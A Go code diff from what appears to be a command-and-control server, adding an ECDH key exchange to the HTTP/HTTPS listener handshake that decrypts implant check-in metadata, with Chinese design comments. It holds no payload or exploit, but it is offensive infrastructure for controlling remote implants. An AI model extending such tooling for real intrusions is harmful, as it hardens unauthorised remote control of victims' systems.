@@ -3,8 +3,8 @@ package communication
 import (
 	"net"
 
-	"BackendTemplate/pkg/command"
 	"BackendTemplate/pkg/c2profile"
+	"BackendTemplate/pkg/command"
 	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/connection"
 	"BackendTemplate/pkg/database"
@@ -14,9 +14,9 @@ import (
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/utils/logx"
 	"crypto/rand"
-	mrand "math/rand"
 	"encoding/binary"
 	"encoding/json"
+	mrand "math/rand"
 	"net/http"
 	"strconv"
 	"strings"
@@ -101,7 +101,46 @@ func GetHttp(w http.ResponseWriter, r *http.Request) {
 // 分支同一处理）：http/https 可多实例且各持独立 VKey/盐，处理器内按类型查库在同类型
 // 多监听器时只能取到任意一行，MetaInfo 解密与会话密钥派生都会用错密钥。
 func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) {
+	// listenerType 在下方按 TLS 判定（http/https），此处先取密钥再判定
+	cfgType := "http"
+	if r.TLS != nil {
+		cfgType = "https"
+	}
+	metaMK, metaSalt := listenerKeys(vkey, salt, cfgType)
+
+	// 会话前 ECDH 交换（X-Kx 头）。必须在解 MetaInfo **之前**：
+	// metaMK 同时用于解 MetaInfo 与派生会话密钥，换掉它下游全部自动跟随。
+	// 无该头时返回 false，走原有静态密钥路径，行为与改造前一致。
+	var usedKx bool
+	if kxMK, used, kxErr := ResolveRequestKey(w, r, metaSalt); kxErr != nil {
+		// 声明了 ECDH 但交换失败：明确拒绝，不退回静态密钥
+		// （否则发个坏公钥就能把连接降级到静态密钥）
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]string{"error": "密钥交换失败"})
+		return
+	} else if used {
+		metaMK = kxMK
+		usedKx = true
+	}
+
 	encryptMetainfo := extractMetadata(r)
+
+	// 纯握手请求（带 X-Kx 但不带 MetaInfo）：交换已完成，直接回 200。
+	// 客户端拿到响应头里的服务端公钥、派生出主密钥后，才会生成并发送 MetaInfo
+	// —— 这样首包不携带任何敏感载荷。
+	if encryptMetainfo == "" {
+		if usedKx {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			json.NewEncoder(w).Encode(map[string]string{"status": "kx"})
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]string{"error": "missing metadata"})
+		return
+	}
 
 	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
 	if err != nil {
@@ -115,12 +154,6 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 		return
 	}
 
-	// listenerType 在下方按 TLS 判定（http/https），此处先取密钥再判定
-	cfgType := "http"
-	if r.TLS != nil {
-		cfgType = "https"
-	}
-	metaMK, metaSalt := listenerKeys(vkey, salt, cfgType)
 	// J4: 拒绝公开默认密钥连接
 	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 		logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
@@ -150,6 +183,11 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 	}
 
 	uid := encrypt.BytesToMD5(metainfo)
+
+	// 解出 uid 后把本次握手绑定上去（仅用于观测/重复握手检测，不改 TTL）
+	if usedKx {
+		BindExchangeUID(r, uid)
+	}
 
 	// https 是 http 协议族的 TLS 包装：按传输选监听器类型（决定密钥/标签/心跳/离线检测来源）。
 	// https 客户端从 https 监听器生成（patch 该监听器的 vkey/salt），故 FirstBlood 也必须按 https 查 DB。
